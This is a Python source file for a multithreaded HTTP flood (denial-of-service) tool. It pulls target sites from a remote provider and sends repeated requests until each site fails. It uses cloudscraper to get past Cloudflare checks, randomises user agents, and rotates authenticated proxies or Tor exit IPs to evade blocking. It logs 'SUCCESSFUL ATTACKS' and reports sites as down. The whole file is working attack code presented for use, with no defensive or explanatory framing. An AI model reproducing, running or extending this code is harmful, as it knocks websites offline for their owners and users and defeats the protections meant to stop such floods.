from concurrent.futures import ThreadPoolExecutor
from random import choice
from sys import stderr

import cloudscraper
from argparse import ArgumentParser
from loguru import logger
from pyuseragents import random as random_useragent
from requests.exceptions import ConnectionError
from urllib3 import disable_warnings

from remote_provider import RemoteProvider
from settings import get_settings
from tor_proxy import TorProxy

settings = get_settings()
disable_warnings()

parser = ArgumentParser()
parser.add_argument('threads', nargs='?', default=settings.DEFAULT_THREADS)
parser.add_argument("-n", "--no-clear", dest="no_clear", action='store_true')
parser.add_argument("-p", "--proxy-view", dest="proxy_view", action='store_true')
parser.add_argument("-t", "--targets", dest="targets", nargs='+', default=[])
parser.set_defaults(verbose=False)
parser.add_argument("-lo", "--logger-output", dest="logger_output")
parser.add_argument("-lr", "--logger-results", dest="logger_results")
parser.set_defaults(no_clear=False)
parser.set_defaults(proxy_view=False)
parser.set_defaults(logger_output=stderr)
parser.set_defaults(logger_results=stderr)
args, unknown = parser.parse_known_args()
no_clear = args.no_clear
proxy_view = args.proxy_view

remoteProvider = RemoteProvider(args.targets)

threads = int(args.threads)

executor = ThreadPoolExecutor(max_workers=threads)
tor_proxy = TorProxy(port=settings.TOR_PORT, control_port=settings.TOR_CONTROL_PORT, password=settings.TOR_PASSWORD)


def set_logger_format():
    logger.remove()
    logger.add(
        args.logger_output,
        format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> |\
            <cyan>{line}</cyan> - <white>{message}</white>")
    logger.add(
        args.logger_results,
        format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> |\
            <cyan>{line}</cyan> - <white>{message}</white>",
        level="SUCCESS")


def make_attack(site: str, scraper):
    attacks_number = 0
    response = scraper.get(site, timeout=settings.READ_TIMEOUT)
    while attacks_number < settings.MAX_REQUESTS_TO_SITE:
        response = scraper.get(site, timeout=settings.READ_TIMEOUT)
        if response.status_code >= 400:
            break
        attacks_number += 1
    return attacks_number, response.status_code


def mainth(site: str):
    scraper = cloudscraper.create_scraper(
        browser=settings.BROWSER
    )
    headers = settings.HEADERS_TEMPLATE
    headers['User-Agent'] = random_useragent()
    scraper.headers.update(headers)
    attacks_number = 0
    try:
        attack = scraper.get(site, timeout=settings.READ_TIMEOUT)
        if attack.status_code >= 302:
            if not settings.ENABLE_TOR:
                for proxy in remoteProvider.get_proxies():
                    if proxy_view:
                        logger.info('USING PROXY:' + proxy["ip"] + " " + proxy["auth"])
                    scraper.proxies.update(
                        {
                            'http': f'http://{proxy["auth"]}@{proxy["ip"]}',
                            'https': f'https://{proxy["auth"]}@{proxy["ip"]}'
                        }
                    )
                    loop_attacks_number, response_code = make_attack(site, scraper)
                    attacks_number += loop_attacks_number
            else:
                tor_proxy.change_ip()
                logger.info(f"USING tor proxy with ip {tor_proxy.get_ip()}")
                scraper.proxies.update(tor_proxy.get_sock5_proxies())
                attacks_count, response_code = make_attack(site, scraper)
                attacks_number += attacks_count
        else:
            attacks_count, response_code = make_attack(site, scraper)
            attacks_number += attacks_count
        if attacks_number > 0:
            logger.success("SUCCESSFUL ATTACKS on " + site + ": " + str(attacks_number))
    except ConnectionError:
        logger.success(f"{site} is down")
    except Exception as exc:
        logger.warning(f"issue happened: {exc}, SUCCESSFUL ATTACKS: {attacks_number}")
    # when thread finishes, add new task to executor
    executor.submit(mainth, choice(remoteProvider.get_target_sites()))


if __name__ == '__main__':
    try:
        set_logger_format()
        while True:
            sites = remoteProvider.get_target_sites()
            # initially start as many tasks as configured threads
            for _ in range(threads):
                executor.submit(mainth, choice(sites))
    except KeyboardInterrupt:
        logger.info("Shutdown")
        executor.shutdown()
